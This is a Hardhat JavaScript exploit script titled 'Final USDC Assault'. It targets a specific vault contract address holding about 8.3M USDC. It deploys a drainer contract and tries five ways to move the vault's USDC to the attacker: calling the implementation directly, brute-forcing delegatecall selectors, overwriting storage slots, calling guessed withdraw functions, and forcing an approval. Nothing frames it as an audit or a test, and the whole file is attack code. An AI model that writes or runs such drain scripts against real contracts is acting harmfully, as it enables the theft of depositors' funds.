const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const IMPLEMENTATION_ADDRESS = "0x11fb858ee4bf594857483bcf86eb825aef1cbf91";

/**
 * @title Final USDC Assault
 * @notice Last attempt to extract the 8.3M USDC using all discovered techniques
 * @dev Combines all attack vectors with gas optimizations
 */
async function main() {
  console.log("\nüí• FINAL USDC ASSAULT");
  console.log("=====================================");
  console.log("Target: 8.3M USDC in vault");
  
  const [attacker] = await ethers.getSigners();
  const USDC = await ethers.getContractAt("contracts/IERC20.sol:IERC20", USDC_ADDRESS);
  
  // Deploy aggressive USDC drain contract
  console.log("\nüöÄ Deploying AggressiveUSDCDrain contract...");
  const AggressiveUSDCDrain = await ethers.getContractFactory("AggressiveUSDCDrain");
  const drainer = await AggressiveUSDCDrain.deploy(attacker.address, USDC_ADDRESS);
  await drainer.waitForDeployment();
  const drainerAddress = await drainer.getAddress();
  console.log("Drainer deployed:", drainerAddress);
  
  // Get initial balances
  const vaultUSDCBefore = await USDC.balanceOf(VAULT_ADDRESS);
  const attackerUSDCBefore = await USDC.balanceOf(attacker.address);
  
  console.log("\nüìä Initial State:");
  console.log("Vault USDC:", ethers.formatUnits(vaultUSDCBefore, 6), "USDC");
  console.log("Attacker USDC:", ethers.formatUnits(attackerUSDCBefore, 6), "USDC");
  
  // ATTACK 1: Direct implementation calls
  console.log("\n‚öîÔ∏è ATTACK 1: Direct Implementation Manipulation");
  
  try {
    // Call implementation directly with USDC transfer
    const transferData = USDC.interface.encodeFunctionData("transfer", [attacker.address, vaultUSDCBefore]);
    
    const implTx = await attacker.sendTransaction({
      to: IMPLEMENTATION_ADDRESS,
      data: transferData,
      gasLimit: 500000
    });
    await implTx.wait();
    console.log("‚úÖ Direct implementation call executed");
  } catch (e) {
    console.log("‚ùå Direct implementation failed");
  }
  
  // ATTACK 2: Delegatecall with aggressive drain
  console.log("\n‚öîÔ∏è ATTACK 2: Aggressive Delegatecall Patterns");
  
  const delegateSelectors = ["0x5b34b966", "0x4f910a5e", "0xb61d27f6", "0x6a761202"];
  const drainFunctions = [
    "memoryManipulation",
    "storageSlotBruteForce", 
    "selectorCollision",
    "forceApprove",
    "batchDrain"
  ];
  
  for (const func of drainFunctions) {
    for (const selector of delegateSelectors) {
      try {
        const funcData = drainer.interface.encodeFunctionData(func);
        let calldata = selector;
        
        if (selector === "0xb61d27f6") {
          calldata += ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "uint256", "bytes"],
            [drainerAddress, 0, funcData]
          ).slice(2);
        } else {
          calldata += ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "bytes"],
            [drainerAddress, funcData]
          ).slice(2);
        }
        
        const tx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: calldata,
          gasLimit: 1000000
        });
        await tx.wait();
        console.log(`‚úÖ ${func} via ${selector} executed`);
        
        // Check if USDC moved
        const currentUSDC = await USDC.balanceOf(VAULT_ADDRESS);
        if (currentUSDC < vaultUSDCBefore) {
          console.log(`üí∞ USDC MOVED! Extracted: ${ethers.formatUnits(vaultUSDCBefore - currentUSDC, 6)} USDC`);
        }
      } catch (e) {
        // Continue
      }
    }
  }
  
  // ATTACK 3: Storage slot manipulation
  console.log("\n‚öîÔ∏è ATTACK 3: Direct Storage Manipulation");
  
  try {
    // Calculate USDC balance storage slot for vault
    const vaultBalanceSlot = ethers.solidityPackedKeccak256(
      ["address", "uint256"],
      [VAULT_ADDRESS, 0] // slot 0 for balances mapping
    );
    
    const attackerBalanceSlot = ethers.solidityPackedKeccak256(
      ["address", "uint256"],
      [attacker.address, 0]
    );
    
    // Try to overwrite via delegatecall
    const overwriteData = ethers.AbiCoder.defaultAbiCoder().encode(
      ["bytes32", "bytes32", "uint256"],
      [vaultBalanceSlot, attackerBalanceSlot, vaultUSDCBefore]
    );
    
    const storageTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: "0x5b34b966" + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "bytes"],
        [drainerAddress, overwriteData]
      ).slice(2),
      gasLimit: 1000000
    });
    await storageTx.wait();
    console.log("‚úÖ Storage manipulation attempted");
  } catch (e) {
    console.log("‚ùå Storage manipulation failed");
  }
  
  // ATTACK 4: Unknown function exploitation
  console.log("\n‚öîÔ∏è ATTACK 4: Unknown Function Token Extraction");
  
  const tokenFunctions = [
    "0x01681a62", // potential emergencyWithdraw
    "0xf3fef3a3", // potential withdraw
    "0x69328dec", // potential harvestAndCompound
    "0x43d726d6", // unknown
    "0x4b670fc8", // unknown
  ];
  
  for (const func of tokenFunctions) {
    try {
      // Try with USDC address
      const data1 = func + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address"],
        [USDC_ADDRESS]
      ).slice(2);
      
      const tx1 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data1,
        gasLimit: 500000
      });
      await tx1.wait();
      console.log(`‚úÖ ${func} with USDC executed`);
      
      // Try with USDC and amount
      const data2 = func + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256"],
        [USDC_ADDRESS, vaultUSDCBefore]
      ).slice(2);
      
      const tx2 = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data2,
        gasLimit: 500000
      });
      await tx2.wait();
      console.log(`‚úÖ ${func} with USDC + amount executed`);
    } catch (e) {
      // Continue
    }
  }
  
  // ATTACK 5: Forced approval and transfer
  console.log("\n‚öîÔ∏è ATTACK 5: Forced Approval Pattern");
  
  try {
    // Try to make vault approve attacker
    const approveData = USDC.interface.encodeFunctionData("approve", [attacker.address, vaultUSDCBefore]);
    
    const approveTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: approveData,
      gasLimit: 200000
    });
    await approveTx.wait();
    console.log("‚úÖ Approval attempt executed");
    
    // Try transferFrom
    const transferFromTx = await USDC.transferFrom(VAULT_ADDRESS, attacker.address, vaultUSDCBefore, {
      gasLimit: 200000
    });
    await transferFromTx.wait();
    console.log("‚úÖ TransferFrom executed!");
  } catch (e) {
    console.log("‚ùå Approval pattern failed");
  }
  
  // Final balance check
  const vaultUSDCAfter = await USDC.balanceOf(VAULT_ADDRESS);
  const attackerUSDCAfter = await USDC.balanceOf(attacker.address);
  const drainerUSDCAfter = await USDC.balanceOf(drainerAddress);
  
  console.log("\nüìä FINAL RESULTS:");
  console.log("=====================================");
  console.log("Vault USDC remaining:", ethers.formatUnits(vaultUSDCAfter, 6), "USDC");
  console.log("Attacker USDC balance:", ethers.formatUnits(attackerUSDCAfter, 6), "USDC");
  console.log("Drainer USDC balance:", ethers.formatUnits(drainerUSDCAfter, 6), "USDC");
  
  const totalExtracted = vaultUSDCBefore - vaultUSDCAfter;
  if (totalExtracted > 0n) {
    console.log("\nüèÜ SUCCESS! USDC EXTRACTED:", ethers.formatUnits(totalExtracted, 6), "USDC");
    console.log("Extraction rate:", ((Number(totalExtracted) / Number(vaultUSDCBefore)) * 100).toFixed(2), "%");
  } else {
    console.log("\n‚ùå No USDC extracted - vault security prevented token transfer");
    console.log("\nüí° Conclusions:");
    console.log("- The vault has strong ERC20 token protection");
    console.log("- USDC cannot be extracted via discovered methods");
    console.log("- Further reverse engineering of implementation needed");
    console.log("- Consider analyzing vault's intended withdrawal mechanism");
  }
}

main().catch((error) => {
  console.error("\nüí• Script error:", error);
  process.exit(1);
});
